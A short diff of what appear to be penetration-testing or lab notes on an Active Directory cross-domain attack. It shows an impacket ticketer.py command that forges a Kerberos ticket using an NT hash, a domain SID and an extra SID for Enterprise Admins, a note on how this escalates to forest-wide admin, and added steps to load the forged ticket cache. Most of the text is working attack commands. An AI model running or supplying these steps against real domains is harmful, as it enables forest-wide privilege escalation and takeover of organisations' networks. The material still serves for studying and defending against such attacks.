@@ -13,3 +13,6 @@ Forge the cross domain ticket now:
 -python3 /usr/share/doc/python3-impacket/examples/ticketer.py -nthash 7bc0301380a0989237882a4cf6a16d4c -domain-sid S-1-5-21-129659399-3041378498-1097317347 -domain ECC.LOCALNET -extra-sid S-1-5-21-129659399-3041378498-1097317347-519 Administrator
  (here -519 is Relative identifier (RID) for Enterprise Admin - By adding the Extra SID ending in -519, you are essentially "faking" a credential that says: "I am not just a local admin; I am an Enterprise Admin for the whole forest."))
 
+export KRB5CCNAME=Administrator.ccache   (run "echo $KRB5CCNAME" to verify)
+
+Update the /etc/hosts (ip-domain name)
